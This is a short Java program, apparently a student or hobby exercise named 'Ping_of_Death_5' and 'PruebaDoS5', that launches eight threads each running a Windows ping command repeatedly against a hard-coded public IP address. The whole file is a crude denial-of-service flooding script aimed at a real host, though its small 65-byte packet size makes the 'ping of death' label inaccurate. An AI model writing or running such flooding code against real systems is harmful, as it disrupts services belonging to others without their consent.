package Ping_of_Death_5;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class PruebaDoS5 {
    public static void main(String[] args) throws IOException {
        ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", "ping 86.109.162.12 -l 65 -n 1000 -w 10000000");
        builder.redirectErrorStream(true);
        for(int i=0; i<8; i++){
            new Hilo5(builder).start();
        }
        
    }
}
